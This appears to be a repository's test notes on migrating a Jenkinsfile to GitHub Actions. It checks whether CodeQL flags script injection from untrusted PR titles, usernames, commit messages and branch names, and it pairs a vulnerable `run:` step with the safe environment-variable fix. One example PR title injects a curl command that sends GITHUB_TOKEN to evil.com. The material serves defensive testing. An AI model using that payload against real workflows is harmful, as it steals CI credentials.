# CodeQL Actions Scanning Test Notes

This repository is designed to test Jenkins-to-GitHub-Actions migration with CodeQL validation.

## Expected CodeQL Findings

When the Jenkinsfile is migrated to GitHub Actions, a naive conversion will produce
script injection vulnerabilities. The `Print Build Info` and `post.failure` stages
reference Jenkins environment variables that map to untrusted GitHub event context:

| Jenkins Variable | Naive GitHub Actions Equivalent | Risk |
|---|---|---|
| `env.CHANGE_TITLE` | `${{ github.event.pull_request.title }}` | Script injection — attacker controls PR title |
| `env.CHANGE_AUTHOR` | `${{ github.event.pull_request.user.login }}` | Script injection — attacker controls username |
| `env.GIT_COMMIT_MESSAGE` | `${{ github.event.head_commit.message }}` | Script injection — attacker controls commit message |
| `env.BRANCH_NAME` | `${{ github.head_ref }}` | Script injection — attacker controls fork branch name |

## What CodeQL Should Catch

CodeQL with `--language=actions` should flag any `run:` step that directly interpolates
these values using `${{ }}` expression syntax, e.g.:

```yaml
# VULNERABLE — CodeQL should flag this
- run: echo "PR Title: ${{ github.event.pull_request.title }}"

# SAFE — use an environment variable instead
- run: echo "PR Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The safe pattern assigns untrusted input to an environment variable, which shell
quoting protects from injection. The vulnerable pattern allows arbitrary command
execution via a crafted PR title like: `"; curl http://evil.com/steal?token=$GITHUB_TOKEN #`

## Testing the Migration

1. Run the Jenkins migration agent against this repo's Jenkinsfile
2. Check if the generated workflow uses `${{ github.event.* }}` directly in `run:` steps
3. Run CodeQL: `codeql database create db --language=actions && codeql database analyze db`
4. Verify CodeQL flags the script injection findings
5. Fix by using environment variable indirection
6. Re-run CodeQL to confirm clean scan
